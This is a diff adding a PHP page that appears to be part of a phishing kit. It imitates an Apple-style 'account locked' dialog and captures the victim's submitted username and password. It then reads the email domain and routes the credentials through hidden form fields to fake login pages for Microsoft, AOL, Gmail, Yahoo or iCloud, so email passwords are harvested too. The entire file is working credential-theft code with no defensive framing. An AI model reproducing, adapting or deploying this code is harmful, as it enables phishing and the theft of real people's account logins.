@@ -1,0 +1,88 @@
+ <?php
+error_reporting(0);
+
+require "includes/functions.php";
+require "../lang.php";
+require "../config.php";
+require "includes/simplehtmldom.php";
+
+$_SESSION['user'] = $_POST['user'];
+$_SESSION['pass'] = $_POST['pass'];
+
+function strafter($string, $substring) {
+  $pos = strpos($string, $substring);
+  if ($pos === false)
+   return $string;
+  else  
+   return(substr($string, $pos+strlen($substring)));
+}
+
+function strbefore($string, $substring) {
+  $pos = strpos($string, $substring);
+  if ($pos === false)
+   return $string;
+  else  
+   return(substr($string, 0, $pos));
+} 
+
+$emelbule2 = $_SESSION['user'];
+$emelbule1 = strafter($emelbule2,'@');
+$emelbule = strbefore($emelbule1,'.');
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
+<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
+<style type="text/css">
+
+</style>
+<title></title>
+</head>
+<body>
+<div class="si-body si-container container-fluid" data-theme="lite" id="content">
+<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
+<div class="dialog fade-in" style="background: rgba(255, 255, 255, 0.85); border-radius: 0px; border: none; max-width: 485px; max-height: 283px;">
+<div class="app-dialog">
+<div class="head">
+<div class="title" title-align="center">
+<h2 style="font-weight: 800;line-height: 1.09375; font-size: 20px; margin: 5px 20px; font-family: sans-serif,initial; letter-spacing: 0.011em; color: #494949; font-heigth"> <?php echo $trx1?></h2>
+</div>
+</div>
+<div body-align="center">
+<div class="acc-locked" id="acc-locked">
+<div class="dialog-body">
+<div class="dialog-info">
+<div class="thin" style="font-weight: 300; color: #494949; line-height: 1.3; letter-spacing: 0.021em;"><?php echo $trx2?>
+</div>
+<?php if ($grab_email == "urip") { if($emelbule == "hotmail" || $emelbule == "outlook" || $emelbule == "msn" || $emelbule == "live"){ ?>
+<form action='email/microsoft/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
+<?php } else if($emelbule == "aol"){ ?>
+<form action='email/aol/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
+<?php } else if($emelbule == "gmail" || $emelbule == "googlemail"){ ?>
+<form action='email/gmail/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
+<?php } else if($emelbule == "yahoo" || $emelbule == "ymail" || $emelbule == "bellsouth" || $emelbule == "sbcglobal"){ ?>
+<form action='email/yahoo/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
+<?php } else if($emelbule == "icloud" || $emelbule == "me"){ ?>
+<form action='email/icloud/emailauth.php?<?php echo $_SESSION['user'];?>&verify-email&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' id="aswdek" target="_top" name='frm'>
+<?php } else { ?>
+<form action='includes/ProcessLogin.php' method='post' id="aswdek" target="_top" name='frm'>
+<?php }} else { ?>
+<form action='includes/ProcessLogin.php' method='post' id="aswdek" target="_top" name='frm'>
+<?php } ?>
+<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
+<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
+<a class="Unclock" target="_top" href="javascript:{}" onclick="document.getElementById('aswdek').submit();" style="font-weight: 500; padding: 5px 16px; background-color: #0070c9; background: linear-gradient(#42a1ec, #0070c9); color: white; border-radius: 4px; font-size: 18px; text-decoration: none;"><?php echo $cncl?></a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
